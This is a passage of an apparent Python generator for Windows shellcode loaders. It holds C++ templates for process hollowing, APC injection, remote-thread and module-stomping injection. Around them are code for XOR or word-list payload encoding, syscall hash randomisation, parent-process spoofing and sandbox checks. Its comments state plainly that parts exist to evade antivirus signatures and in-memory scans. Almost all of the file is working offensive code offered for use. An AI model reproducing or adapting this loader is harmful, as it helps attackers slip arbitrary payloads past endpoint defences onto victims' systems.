    eString.clear();

    PVOID f2 = (PVOID)funcAddress;
    long funcOffset = (uintptr_t)f2 - (uintptr_t)xps;

    auto eString2 = skCrypt("funcOffset: ");
    printf("%s%#p\\n", eString2.decrypt(), funcOffset);
    eString2.clear();

    HMODULE hMods[1024];
    DWORD cbNeeded;

    LPVOID moduleBaseAddr;

    if (EnumProcessModules(processHandle, hMods, sizeof(hMods), &cbNeeded))
    {
        for (int i = 0; i < (cbNeeded / sizeof(HMODULE)); i++)
        {
            TCHAR szModName[MAX_PATH];
            // Get the full path to the module's file.
            if (GetModuleFileNameEx(processHandle, hMods[i], szModName, sizeof(szModName) / sizeof(TCHAR)))
            {
                String dang = szModName;
                if (dang.find(moduleToInject) != std::string::npos)
                {
                    _tprintf(TEXT("\\t%s (0x%08X)\\n"), szModName, hMods[i]);
                    moduleBaseAddr = hMods[i];
                    safe_print(skCrypt("Module found"));
                    auto eString3 = skCrypt("szModName: ");
                    printf("%s%s\\n", eString3.decrypt(), szModName);
                    eString3.clear();
                    auto eString4 = skCrypt("Baseaddr: ");
                    printf("%s%#p\\n", eString4.decrypt(), hMods[i]);
                    eString4.clear();
                }
            }
        }
    }

    LPVOID remoteFuncAddress = (LPVOID)((uintptr_t)moduleBaseAddr + (uintptr_t)funcOffset);

    auto eString5 = skCrypt("remoteFuncAddress: ");
    printf("%s%#p\\n", eString5.decrypt(), remoteFuncAddress);
    eString5.clear();

    SIZE_T shellcodeLen = payload_len;
    SIZE_T bytesWritten2;

    uintptr_t jankOffset = (uintptr_t)remoteFuncAddress % (0x1000);
    auto eString6 = skCrypt("jankOffset: ");
    printf("%s%#p\\n", eString6.decrypt(), jankOffset);
    eString6.clear();

    res = NtProtectVirtualMemory(processHandle, &remoteFuncAddress, &shellcodeLen, 0x40, &oldProtect);
    safe_print(skCrypt("NtProtectVirtualMemory res (shellcode): "), res);
    res = NtWriteVirtualMemory(processHandle, (LPVOID)((uintptr_t)remoteFuncAddress + jankOffset), decoded, shellcodeLen, &bytesWritten2);
    safe_print(skCrypt("NtWriteVirtualMemory res (shellcode): "), res);

    HANDLE hThread2;
    res = NtCreateThreadEx(&hThread2, GENERIC_EXECUTE, NULL, processHandle, funcAddress, NULL, FALSE, 0, 0, 0, NULL);
    safe_print(skCrypt("NtCreateThreadEx res (shellcode): "), res);

    NtClose(hThread);
    NtClose(hThread2);
    NtClose(processHandle);
    return 0;
"""

process_hollow_stub = """
    REPLACE_ME_GetSyscallStubP2

    REPLACE_ME_SANDBOX_CALL
    deC(REPLACE_ME_DECARG);

    //next few lines do nothing... but they help evade some AV signatures
    NTSTATUS res = -1;
    if (res == 0) {
        printf("Doing nothing!");
    }

    HANDLE hParent = GetParentHandle(skCrypt("explorer.exe"));
    if (hParent == INVALID_HANDLE_VALUE)
        return 0;

    PROCESS_INFORMATION pi = SpawnProc((LPSTR)skCrypt("REPLACE_ME_PROCESS"), hParent);
    if (pi.hProcess == INVALID_HANDLE_VALUE || pi.hThread == INVALID_HANDLE_VALUE)
        return 0;
    
    HANDLE hProcess = pi.hProcess;
    HANDLE hThread = pi.hThread;
    PROCESS_BASIC_INFORMATION bi;
    ULONG tmp;

    res = NtQueryInformationProcess(hProcess, (PROCESSINFOCLASS)0, &bi, sizeof(bi), &tmp);

    if (res != 0){
        safe_print(skCrypt("NtQueryInformationProcess FAILED to query created process, exiting: "), res);
        return 0;
    }
    else {
        safe_print(skCrypt("NtQueryInformationProcess queried the created process sucessfully."));
    }

    __int64 TEST = (__int64)bi.PebBaseAddress;
    __int64 TEST2 = TEST + 0x10;
    PVOID ptrImageBaseAddress = (PVOID)TEST2;

    auto eString = skCrypt("bi.PebBaseAddress: ");
    printf("%s%#p\\n", eString.decrypt(), bi.PebBaseAddress);
    eString.clear();
    auto eString2 = skCrypt("ptrImageBaseAddress: ");
    printf("%s%#p\\n", eString2.decrypt(), ptrImageBaseAddress);
    eString2.clear();

    PVOID baseAddressBytes;
    unsigned char data[513];
    SIZE_T nBytes;

    res = NtReadVirtualMemory(hProcess, ptrImageBaseAddress, &baseAddressBytes, sizeof(PVOID), &nBytes);

    if (res != 0){
        safe_print(skCrypt("NtReadVirtualMemory FAILED to read image base address, exiting: "), res);
        return 0;
    }
    else{
        safe_print(skCrypt("NtReadVirtualMemory read image base address successfully."));
    }

    auto eString3 = skCrypt("baseAddressBytes: ");
    printf("%s%#p\\n", eString3.decrypt(), baseAddressBytes);
    eString3.clear();

    PVOID imageBaseAddress = (PVOID)(__int64)(baseAddressBytes);

    res = NtReadVirtualMemory(hProcess, imageBaseAddress, &data, sizeof(data), &nBytes);

    if (res != 0){
        safe_print(skCrypt("NtReadVirtualMemory FAILED to read first 0x200 bytes of the PE structure, exiting: "), res);
        auto eString4 = skCrypt("nBytes: ");
        printf("%s%#p\\n", eString4.decrypt(), nBytes);
        eString4.clear();
        return 0;
    }
    else{
        safe_print(skCrypt("NtReadVirtualMemory read first 0x200 bytes of the PE structure successfully."));
    }
    
    uint32_t e_lfanew = *reinterpret_cast<uint32_t*>(data + 0x3c);
    //std::cout << "e_lfanew: " << e_lfanew << std::endl;
    uint32_t entrypointRvaOffset = e_lfanew + 0x28;
    //std::cout << "entrypointRvaOffset: " << entrypointRvaOffset << std::endl;
    uint32_t entrypointRva = *reinterpret_cast<uint32_t*>(data + entrypointRvaOffset);
    //std::cout << "entrypointRva: " << entrypointRva << std::endl;
    __int64 rvaconv = (__int64)imageBaseAddress;
    __int64 rvaconv2 = rvaconv + entrypointRva;
    PVOID entrypointAddress = (PVOID)rvaconv2;
    auto eString5 = skCrypt("entrypointAddress: ");
    printf("%s%#p\\n", eString5.decrypt(), entrypointAddress);
    eString5.clear();

    ULONG oldprotect;
    SIZE_T bytesWritten;
    SIZE_T shellcodeLength = payload_len;

    res = NtProtectVirtualMemory(hProcess, &entrypointAddress, &shellcodeLength, 0x40, &oldprotect);

    if (res != 0){
        safe_print(skCrypt("NtProtectVirtualMemory FAILED to set permissions on entrypointAddress: "), res);
        return 0;
    }
    else{
        safe_print(skCrypt("NtProtectVirtualMemory set permissions on entrypointAddress successfully."));
    }

    res = NtWriteVirtualMemory(hProcess, entrypointAddress, decoded, payload_len, &bytesWritten);

    if (res != 0){
        safe_print(skCrypt("NtWriteVirtualMemory FAILED to write decoded payload to entrypointAddress: "), res);
        return 0;
    }
    else{
        safe_print(skCrypt("NtWriteVirtualMemory wrote decoded payload to entrypointAddress successfully."));
    }

    res = NtProtectVirtualMemory(hProcess, &entrypointAddress, &shellcodeLength, oldprotect, &tmp);
    if (res != 0){
        safe_print(skCrypt("NtProtectVirtualMemory FAILED to revert permissions on entrypointAddress: "), res);
        return 0;
    }
    else{
        safe_print(skCrypt("NtProtectVirtualMemory revert permissions on entrypointAddress successfully."));
    }

    res = NtResumeThread(hThread, &tmp);
    if (res != 0){
        safe_print(skCrypt("NtResumeThread FAILED to to resume thread: "), res);
        return 0;
    }
    else{
        safe_print(skCrypt("NtResumeThread resumed thread successfully."));
    }

    NtClose(hProcess);
    NtClose(hThread);
"""

CurrentThread_stub = """
    REPLACE_ME_GetSyscallStubP2

    HANDLE hProc = GetCurrentProcess();
    DWORD oldprotect = 0;
    PVOID base_addr = NULL;
    HANDLE thandle = NULL;
    SIZE_T bytesWritten;
    SIZE_T pnew = payload_len;

    REPLACE_ME_SANDBOX_CALL
    deC(REPLACE_ME_DECARG);

    NTSTATUS res = NtAllocateVirtualMemory(hProc, &base_addr, 0, &pnew, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (res != 0){
        safe_print(skCrypt("NtAllocateVirtualMemory FAILED to allocate memory in the current process, exiting: "), res);
        return 0;
    }
    else {
        safe_print(skCrypt("NtAllocateVirtualMemory allocated memory in the current process sucessfully."));
    }

    res = NtWriteVirtualMemory(hProc, base_addr, decoded, payload_len, &bytesWritten);

    if (res != 0){
        safe_print(skCrypt("NtWriteVirtualMemory FAILED to write decoded payload to allocated memory: "), res);
        return 0;
    }
    else{
        safe_print(skCrypt("NtWriteVirtualMemory wrote decoded payload to allocated memory successfully."));
    }

    res = NtProtectVirtualMemory(hProc, &base_addr, (PSIZE_T)&payload_len, PAGE_NOACCESS, &oldprotect);

    if (res != 0){
        safe_print(skCrypt("NtProtectVirtualMemory FAILED to modify permissions: "), res);
        return 0;
    }
    else{
        safe_print(skCrypt("NtProtectVirtualMemory modified permissions successfully."));
    }

    res = NtCreateThreadEx(&thandle, GENERIC_EXECUTE, NULL, hProc, base_addr, NULL, TRUE, 0, 0, 0, NULL);

    if (res != 0){
        safe_print(skCrypt("NtCreateThreadEx FAILED to create thread in current process: "), res);
        return 0;
    }
    else{
        safe_print(skCrypt("NtCreateThreadEx created thread in current process successfully."));
    }

    res = NtProtectVirtualMemory(hProc, &base_addr, (PSIZE_T)&payload_len, PAGE_EXECUTE_READ, &oldprotect);

    if (res != 0){
        safe_print(skCrypt("NtProtectVirtualMemory FAILED to modify permissions: "), res);
        return 0;
    }
    else{
        safe_print(skCrypt("NtProtectVirtualMemory modified permissions successfully."));
    }

    res = NtResumeThread(thandle, 0);

    if (res != 0){
        safe_print(skCrypt("NtResumeThread FAILED to resume created thread: "), res);
        return 0;
    }
    else{
        safe_print(skCrypt("NtResumeThread resumed created thread successfully."));
    }

    res = NtWaitForSingleObject(thandle, -1, NULL);   
"""

EnumDisplayMonitors_stub = """
    REPLACE_ME_GetSyscallStubP2

    HANDLE hProc = GetCurrentProcess();
    DWORD oldprotect = 0;
    PVOID base_addr = NULL;
    SIZE_T bytesWritten;
    SIZE_T pnew = payload_len;
    NTSTATUS res;

    REPLACE_ME_SANDBOX_CALL
    deC(REPLACE_ME_DECARG);

    res = NtAllocateVirtualMemory(hProc, &base_addr, 0, &pnew, MEM_COMMIT, PAGE_READWRITE);

    if (res != 0){
        safe_print(skCrypt("NtAllocateVirtualMemory FAILED to allocate memory in the current process, exiting: "), res);
        return 0;
    }
    else {
        safe_print(skCrypt("NtAllocateVirtualMemory allocated memory in the current process sucessfully."));
    }

    res = NtWriteVirtualMemory(hProc, base_addr, decoded, pnew, &bytesWritten);

    if (res != 0){
        safe_print(skCrypt("NtWriteVirtualMemory FAILED to write decoded payload to allocated memory: "), res);
        return 0;
    }
    else{
        safe_print(skCrypt("NtWriteVirtualMemory wrote decoded payload to allocated memory successfully."));
    }

    res = NtProtectVirtualMemory(hProc, &base_addr, &pnew, PAGE_EXECUTE_READ, &oldprotect);
    if (res != 0){
        safe_print(skCrypt("NtProtectVirtualMemory FAILED to modify permissions: "), res);
        return 0;
    }
    else{
        safe_print(skCrypt("NtProtectVirtualMemory modified permissions successfully."));
    }

    EnumDisplayMonitors(NULL, NULL, (MONITORENUMPROC)base_addr, NULL);
"""

QueueUserAPC_stub = """
    REPLACE_ME_GetSyscallStubP2

    DWORD oldprotect = 0;
    PVOID base_addr = NULL;
    SIZE_T bytesWritten;
    SIZE_T pnew = payload_len;

    REPLACE_ME_SANDBOX_CALL
    deC(REPLACE_ME_DECARG);

    //next few lines do nothing... but they help evade some AV signatures
    NTSTATUS res = -1;
    if (res == 0) {
        printf("Doing nothing!");
    }

    HANDLE hParent = GetParentHandle(skCrypt("explorer.exe"));
    if (hParent == INVALID_HANDLE_VALUE)
        return 0;

    PROCESS_INFORMATION pi = SpawnProc((LPSTR)skCrypt("REPLACE_ME_PROCESS"), hParent);
    if (pi.hProcess == INVALID_HANDLE_VALUE || pi.hThread == INVALID_HANDLE_VALUE)
        return 0;
    
    HANDLE hProcess = pi.hProcess;
    HANDLE hThread = pi.hThread;

    res = NtAllocateVirtualMemory(hProcess, &base_addr, 0, &pnew, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (res != 0){
        safe_print(skCrypt("NtAllocateVirtualMemory FAILED to allocate memory in created process, exiting: "), res);
        return 0;
    }
    else {
        safe_print(skCrypt("NtAllocateVirtualMemory allocated memory in the created process sucessfully."));
    }

    res = NtWriteVirtualMemory(hProcess, base_addr, decoded, payload_len, &bytesWritten);

    if (res != 0){
        safe_print(skCrypt("NtWriteVirtualMemory FAILED to write decoded payload to allocated memory: "), res);
        return 0;
    }
    else{
        safe_print(skCrypt("NtWriteVirtualMemory wrote decoded payload to allocated memory successfully."));
    }

    res = NtProtectVirtualMemory(hProcess, &base_addr, (PSIZE_T)&payload_len, PAGE_EXECUTE_READ, &oldprotect);

    if (res != 0){
        safe_print(skCrypt("NtProtectVirtualMemory FAILED to modify permissions: "), res);
        return 0;
    }
    else{
        safe_print(skCrypt("NtProtectVirtualMemory modified permissions successfully."));
    }

    res = NtQueueApcThread(hThread, (PKNORMAL_ROUTINE)base_addr, NULL, NULL, NULL);

    if (res != 0){
        safe_print(skCrypt("NtQueueApcThread FAILED to add routine to APC queue: "), res);
        return 0;
    }
    else{
        safe_print(skCrypt("NtQueueApcThread added routine to APC queue successfully."));
    }

    res = NtAlertResumeThread(hThread, NULL);

    if (res != 0){
        safe_print(skCrypt("NtAlertResumeThread FAILED to resume thread: "), res);
        return 0;
    }
    else{
        safe_print(skCrypt("NtAlertResumeThread resumed thread successfully."));
    }

    NtClose(hProcess);
    NtClose(hThread);
"""

RemoteThreadSuspended_stub = """
    REPLACE_ME_GetSyscallStubP2

    DWORD oldprotect = 0;
    PVOID base_addr = NULL;
    HANDLE thandle = NULL;
    HANDLE hProcess = NULL;
    SIZE_T bytesWritten;
    SIZE_T pnew = payload_len;

    REPLACE_ME_SANDBOX_CALL
    deC(REPLACE_ME_DECARG);

    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

    if (Process32First(snapshot, &entry) == TRUE)
    {
        while (Process32Next(snapshot, &entry) == TRUE)
        {
            if (stricmp(entry.szExeFile, skCrypt("REPLACE_ME_PROCESS")) == 0)
            {
                OBJECT_ATTRIBUTES oa;
                CLIENT_ID cid;
                InitializeObjectAttributes(&oa, 0, 0, 0, 0);
                cid.UniqueThread = 0;
                cid.UniqueProcess = UlongToHandle(entry.th32ProcessID);

                NTSTATUS res = NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &oa, &cid);
                if (res != 0){
                    safe_print(skCrypt("NtOpenProcess FAILED to open the target process, exiting: "), res);
                    return 0;
                }
                else {
                    safe_print(skCrypt("NtOpenProcess opened the target process sucessfully."));
                }

                res = NtAllocateVirtualMemory(hProcess, &base_addr, 0, &pnew, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

                if (res != 0){
                    safe_print(skCrypt("NtAllocateVirtualMemory FAILED to allocate memory in the current process, exiting: "), res);
                    return 0;
                }
                else {
                    safe_print(skCrypt("NtAllocateVirtualMemory allocated memory in the current process sucessfully."));
                }

                res = NtWriteVirtualMemory(hProcess, base_addr, decoded, payload_len, &bytesWritten);

                if (res != 0){
                    safe_print(skCrypt("NtWriteVirtualMemory FAILED to write decoded payload to allocated memory: "), res);
                    return 0;
                }
                else{
                    safe_print(skCrypt("NtWriteVirtualMemory wrote decoded payload to allocated memory successfully."));
                }

                res = NtProtectVirtualMemory(hProcess, &base_addr, (PSIZE_T)&payload_len, PAGE_NOACCESS, &oldprotect);

                if (res != 0){
                    safe_print(skCrypt("NtProtectVirtualMemory FAILED to modify permissions: "), res);
                    return 0;
                }
                else{
                    safe_print(skCrypt("NtProtectVirtualMemory modified permissions successfully."));
                }

                res = NtCreateThreadEx(&thandle, GENERIC_EXECUTE, NULL, hProcess, base_addr, NULL, TRUE, 0, 0, 0, NULL);

                if (res != 0){
                    safe_print(skCrypt("NtCreateThreadEx FAILED to create thread in current process: "), res);
                    return 0;
                }
                else{
                    safe_print(skCrypt("NtCreateThreadEx created thread in current process successfully."));
                }

                safe_print(skCrypt("Sleeping for 10 seconds to avoid in-memory AV scan..."));
                Sleep(10000);

                res = NtProtectVirtualMemory(hProcess, &base_addr, (PSIZE_T)&payload_len, PAGE_EXECUTE_READ, &oldprotect);

                if (res != 0){
                    safe_print(skCrypt("NtProtectVirtualMemory FAILED to modify permissions: "), res);
                    return 0;
                }
                else{
                    safe_print(skCrypt("NtProtectVirtualMemory modified permissions successfully."));
                }

                res = NtResumeThread(thandle, 0);

                if (res != 0){
                    safe_print(skCrypt("NtResumeThread FAILED to resume created thread: "), res);
                    return 0;
                }
                else{
                    safe_print(skCrypt("NtResumeThread resumed created thread successfully."));
                }

                NtClose(hProcess);
                NtClose(thandle);
            }
        }
    }

    NtClose(snapshot);
"""

RemoteThreadContext_stub = """
    REPLACE_ME_GetSyscallStubP2

    DWORD oldprotect = 0;
    PVOID base_addr = NULL;
    SIZE_T bytesWritten;
    SIZE_T pnew = payload_len;

    REPLACE_ME_SANDBOX_CALL
    deC(REPLACE_ME_DECARG);

    //next few lines do nothing... but they help evade some AV signatures
    NTSTATUS res = -1;
    if (res == 0) {
        printf("Doing nothing!");
    }

    HANDLE hParent = GetParentHandle(skCrypt("explorer.exe"));
    if (hParent == INVALID_HANDLE_VALUE)
        return 0;

    PROCESS_INFORMATION pi = SpawnProc((LPSTR)skCrypt("REPLACE_ME_PROCESS"), hParent);
    if (pi.hProcess == INVALID_HANDLE_VALUE || pi.hThread == INVALID_HANDLE_VALUE)
        return 0;
    
    HANDLE hProcess = pi.hProcess;

    res = NtAllocateVirtualMemory(hProcess, &base_addr, 0, &pnew, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (res != 0){
        safe_print(skCrypt("NtAllocateVirtualMemory FAILED to allocate memory in created process, exiting: "), res);
        return 0;
    }
    else {
        safe_print(skCrypt("NtAllocateVirtualMemory allocated memory in the created process sucessfully."));
    }

    res = NtWriteVirtualMemory(hProcess, base_addr, decoded, payload_len, &bytesWritten);

    if (res != 0){
        safe_print(skCrypt("NtWriteVirtualMemory FAILED to write decoded payload to allocated memory: "), res);
        return 0;
    }
    else{
        safe_print(skCrypt("NtWriteVirtualMemory wrote decoded payload to allocated memory successfully."));
    }

    res = NtProtectVirtualMemory(hProcess, &base_addr, (PSIZE_T)&payload_len, PAGE_EXECUTE_READ, &oldprotect);

    if (res != 0){
        safe_print(skCrypt("NtProtectVirtualMemory FAILED to modify permissions: "), res);
        return 0;
    }
    else{
        safe_print(skCrypt("NtProtectVirtualMemory modified permissions successfully."));
    }

    FARPROC _loadLibrary = GetProcAddress(LoadLibraryA("kernel32.dll"), "LoadLibraryA");
    if (_loadLibrary == NULL) {
        safe_print(skCrypt("[X] Error: Could not find address of LoadLibrary"));
        return 0;
    }

    HANDLE hThread;

    res = NtCreateThreadEx(&hThread, MAXIMUM_ALLOWED, NULL, hProcess, (PVOID)_loadLibrary, NULL, TRUE, 0, 0, 0, NULL);

    if (res != 0){
        safe_print(skCrypt("NtCreateThreadEx FAILED to create thread in current process: "), res);
        return 0;
    }
    else{
        safe_print(skCrypt("NtCreateThreadEx created thread in current process successfully."));
    }

    CONTEXT ctx;
    ZeroMemory(&ctx, sizeof(CONTEXT));
    ctx.ContextFlags = CONTEXT_CONTROL;

    res = NtGetContextThread(hThread, &ctx);

    if (res != 0){
        safe_print(skCrypt("NtGetContextThread FAILED to get context of thread: "), res);
        return 0;
    }
    else{
        safe_print(skCrypt("NtGetContextThread got context of thread successfully."));
    }

    ctx.Rip = (DWORD64)base_addr;

    res = NtSetContextThread(hThread, &ctx);

    if (res != 0){
        safe_print(skCrypt("NtSetContextThread FAILED to set context of thread: "), res);
        return 0;
    }
    else{
        safe_print(skCrypt("NtSetContextThread set context of thread successfully."));
    }

    res = NtResumeThread(hThread, 0);

    if (res != 0){
        safe_print(skCrypt("NtResumeThread FAILED to resume created thread: "), res);
        return 0;
    }
    else{
        safe_print(skCrypt("NtResumeThread resumed created thread successfully."));
    }

    NtClose(hProcess);
    NtClose(hThread);
"""

invoke_sandbox_check = """
    if (CheckSandbox()) {
        safe_print(skCrypt("Sandbox checks failed; exiting."));
        return 0;
    }

    safe_print(skCrypt("Sandbox checks passed"));
"""

rundll_stub = """
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    //HANDLE threadhandle;
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
            main();
            //threadhandle = CreateThread(NULL, 0, main, NULL, 0, NULL);
            //CloseHandle(threadhandle);
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
"""

# Thanks to @S4ntiagoP and @Snovvcrash for the API hashing code
def get_old_seed():
    with open('Syscalls.h') as f:
        code = f.read()
    match = re.search(r'#define SW2_SEED (0x[a-fA-F0-9]{8})', code)
    assert match is not None, 'SW2_SEED not found!'
    return match.group(1)

def replace_seed(old_seed, new_seed):
    with open('Syscalls.h') as f:
        code = f.read()
    code = code.replace(
        f'#define SW2_SEED {old_seed}',
        f'#define SW2_SEED 0x{new_seed:08X}',
        1
    )
    with open('Syscalls.h', 'w') as f:
        f.write(code)

def get_function_hash(seed, function_name):
    function_hash = seed
    if function_name[:2] == 'Nt':
        function_name = 'Zw' + function_name[2:]
    name = function_name + '\0'
    ror8 = lambda v: ((v >> 8) & (2 ** 32 - 1)) | ((v << 24) & (2 ** 32 - 1))

    for segment in [s for s in [name[i:i + 2] for i in range(len(name))] if len(s) == 2]:
        partial_name_short = struct.unpack('<H', segment.encode())[0]
        function_hash ^= partial_name_short + ror8(function_hash)

    return function_hash

def replace_syscall_hashes(seed):
    with open('Syscalls.h') as f:
        code = f.read()
    regex = re.compile(r'#define (Nt[^(]+) ')
    syscall_names = re.findall(regex, code)
    syscall_names = set(syscall_names)
    syscall_definitions = code.split('EXTERN_C DWORD SW2_GetSyscallNumber')[2]

    for syscall_name in syscall_names:
        regex = re.compile('#define ' + syscall_name + '.*?mov ecx, (0x0[A-Fa-f0-9]{8})', re.DOTALL)
        match = re.search(regex, syscall_definitions)
        assert match is not None, f'hash of syscall {syscall_name} not found!'
        old_hash = match.group(1)
        new_hash = get_function_hash(seed, syscall_name)
        #print(f'{syscall_name} -> {old_hash} -> 0x0{new_hash:08X}')
        code = code.replace(
            old_hash,
            f'0x0{new_hash:08X}'
        )

    with open('Syscalls.h', 'w') as f:
        f.write(code)

def generateKey(length):
    letters = string.ascii_letters + string.digits
    key = ''.join(random.choice(letters) for i in range(length))
    return key

def generateRandomSyscall(length):
    letters = string.ascii_letters
    syscall = ''.join(random.choice(letters) for i in range(length))
    return syscall


def main(stub, infile, outfile, key, process, method, no_randomize, verbose, sandbox, get_syscallstub, no_sandbox, obfuscator_LLVM, word_encode, dll, sandbox_arg, no_ppid_spoof, dll_proxy):
    print("[+] ICYGUIDER'S CUSTOM SYSCALL SHELLCODE LOADER")
    method = method.lower()
    file_size = os.path.getsize(infile)
    if method == "processhollow":
        #Take infile and add 5000 nops to shellcode.
        #This is because our shellcode doesn't seem to end up exactly where we write it to for some reason.
        #If you know why this is happening, feel free to reach out to me!
        with open(infile, 'rb') as contents:
            save = contents.read()
        tempfile = "temp_infile"
        with open(tempfile, 'wb') as contents:
            contents.write(b"\x90"*5000)
            contents.write(save)
        file = open(tempfile, 'rb')
        contents = file.read()
        file.close()
        os.system("rm {}".format(tempfile))
    else:
        file = open(infile, 'rb')
        contents = file.read()
        file.close()

    if word_encode == False:
        encrypted = []
        for b in range(len(contents)):
            test = contents[b]
            for i in range(len(key)):
                test = test ^ ord(key[i])
            encrypted.append("{:02x}".format(test))

        stub = stub.replace("REPLACE_DECODE_FUNCTION", regularDecode)

        output = "unsigned char payload[] = {"

        count = 0
        for x in encrypted:
            if count < len(encrypted)-1:
                output += "0x{},".format(x)
            else:
                output += "0x{}".format(x)
            count += 1

        output += "};"

        stub = stub.replace("REPLACE_ME_SHELLCODE_VARS", regularShellcode)
        stub = stub.replace("REPLACE_ME_PAYLOAD", output)
        stub = stub.replace("REPLACE_ME_KEY", key)
    else:
        print("[+] Storing shellcode as english word list")
        if os.path.exists("words_alpha.txt") == False:
            print("[+] Downloading list of english words...")
            urllib.request.urlretrieve('https://github.com/dwyl/english-words/raw/master/words_alpha.txt', "words_alpha.txt")
        f = open("words_alpha.txt", "r")
        wordlist = f.readlines()
        f.close()
        chosen = []
        cwordstring = "char* words[256] = {"
        for i in range(256):
            selection = wordlist[random.randint(0, len(wordlist))].strip("\n")
            cwordstring += '"{}", '.format(selection)
            chosen.append(selection)
        cwordstring = cwordstring[:-2]
        cwordstring += "};"

        fwordsstring = "char* filewords[{}] = {{".format(len(contents))

        filewords = [None] * len(contents)
        for i in range(len(contents)):
            #print(contents[i])
            filewords[i] = chosen[int(contents[i])]
            fwordsstring += '"{}", '.format(filewords[i])

        fwordsstring = fwordsstring[:-2]
        fwordsstring += "};"
        stub = stub.replace("REPLACE_DECODE_FUNCTION", wordDecode)
        stub = stub.replace("REPLACE_ME_SHELLCODE_VARS", wordShellcode)
        stub = stub.replace("REPLACE_ME_WORDLIST", cwordstring)
        stub = stub.replace("REPLACE_ME_FILEWORDS", fwordsstring)

    stub = stub.replace("REPLACE_SAFEPRINT_FUNCTIONS", safePrint)

    if method == "processhollow":
        stub = stub.replace("REPLACE_PROCESS_FUNCTIONS", process_functions)
        stub = stub.replace("REPLACE_STUB_METHOD", process_hollow_stub)
        print("[+] Using {} for process hollowing".format(process))
        stub = stub.replace("REPLACE_ME_PROCESS", process)
    if method == "queueuserapc":
        stub = stub.replace("REPLACE_PROCESS_FUNCTIONS", process_functions)
        stub = stub.replace("REPLACE_STUB_METHOD", QueueUserAPC_stub)
        print("[+] Using {} for QueueUserAPC injection".format(process))
        stub = stub.replace("REPLACE_ME_PROCESS", process)
    if method == "remotethreadsuspended":
        stub = stub.replace("REPLACE_PROCESS_FUNCTIONS", "")
        stub = stub.replace("REPLACE_STUB_METHOD", RemoteThreadSuspended_stub)
        print("[+] Using {} for RemoteThreadSuspended injection".format(process))
        stub = stub.replace("REPLACE_ME_PROCESS", process)
    if method == "remotethreadcontext":
        stub = stub.replace("REPLACE_PROCESS_FUNCTIONS", process_functions)
        stub = stub.replace("REPLACE_STUB_METHOD", RemoteThreadContext_stub)
        print("[+] Using {} for RemoteThreadContext injection".format(process))
        stub = stub.replace("REPLACE_ME_PROCESS", process)
    if method == "currentthread":
        stub = stub.replace("REPLACE_PROCESS_FUNCTIONS", "")
        stub = stub.replace("REPLACE_STUB_METHOD", CurrentThread_stub)
    if method == "modulestomping":
        #Must use GetSyscallStub for Module Stomping. SysWhispers2 version is unstable, try at own risk.
        get_syscallstub = True
        stub = stub.replace("REPLACE_PROCESS_FUNCTIONS", process_functions)
        stub = stub.replace("REPLACE_STUB_METHOD", module_stomping_stub)
        stub = stub.replace("REPLACE_ME_PROCESS", process)
        print("[+] Using {} for ModuleStomping".format(process))
    if method == "enumdisplaymonitors":
         stub = stub.replace("REPLACE_PROCESS_FUNCTIONS", "")
         stub = stub.replace("REPLACE_STUB_METHOD", EnumDisplayMonitors_stub)

    if word_encode == False:
        stub = stub.replace("REPLACE_ME_DECARG", "payload")
    else:
        stub = stub.replace("REPLACE_ME_DECARG", "")

    if get_syscallstub == True:
        print("[+] Using GetSyscallStub for syscalls")
        stub = stub.replace("REPLACE_ME_SYSCALL_INCLUDE", '#include <winternl.h>\n#pragma comment(lib, "ntdll")')
        stub = stub.replace("REPLACE_GetSyscallStubP1", GetSyscallStubP1)
        stub = stub.replace("REPLACE_ME_GetSyscallStubP2", GetSyscallStubP2)
    else:
        print("[+] Using SysWhispers2 for syscalls")
        stub = stub.replace("REPLACE_ME_SYSCALL_INCLUDE", '#include <winternl.h>\n#include "Syscalls2.h"')
        stub = stub.replace("REPLACE_GetSyscallStubP1", "")
        stub = stub.replace("REPLACE_ME_GetSyscallStubP2", "")
        print("[+] Re-hashing API syscalls")
        new_seed = random.randint(2 ** 28, 2 ** 32 - 1)
        #new_seed = 0x1337C0DE
        old_seed = get_old_seed()
        replace_seed(old_seed, new_seed)
        replace_syscall_hashes(new_seed)

    if no_ppid_spoof == True:
        print("[+] PPID Spoofing has been disabled")
        stub = stub.replace("REPLACE_PPID_SPOOF", "")
    else:
        stub = stub.replace("REPLACE_PPID_SPOOF", "UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(HANDLE), NULL, NULL);")

    if no_sandbox == True:
        print("[+] Sandbox checks have been disabled")
        stub = stub.replace("REPLACE_SANDBOX_CHECK", "")
        stub = stub.replace("REPLACE_ME_SANDBOX_CALL", "")
    elif sandbox == "dll":
        print("[+] Using DLL enumeration for sandbox evasion")
        stub = stub.replace("REPLACE_SANDBOX_CHECK", dll_sandbox_check)
        stub = stub.replace("REPLACE_ME_SANDBOX_CALL", "getLoadedDlls();")
    elif sandbox == "hostname":
        print("[+] Using hostname enumeration for sandbox evasion")
        stub = stub.replace("REPLACE_SANDBOX_CHECK", hostname_sanbox_check)
        stub = stub.replace("REPLACE_ME_HOSTNAME", sandbox_arg)
        stub = stub.replace("REPLACE_ME_SANDBOX_CALL", "hostcheck();")
    elif sandbox == "username":
        print("[+] Using hostname enumeration for sandbox evasion")
        stub = stub.replace("REPLACE_SANDBOX_CHECK", username_sanbox_check)
        stub = stub.replace("REPLACE_ME_USERNAME", sandbox_arg)
        stub = stub.replace("REPLACE_ME_SANDBOX_CALL", "usercheck();")
    elif sandbox == "domain":
        print("[+] Using domain enumeration for sandbox evasion")
        stub = stub.replace("REPLACE_SANDBOX_CHECK", domain_sanbox_check)
        stub = stub.replace("REPLACE_ME_DOMAINNAME", sandbox_arg)
        stub = stub.replace("REPLACE_ME_SANDBOX_CALL", "domaincheck();")
    else:
        print("[+] Using sleep technique for sandbox evasion")
        stub = stub.replace("REPLACE_SANDBOX_CHECK", sandbox_check)
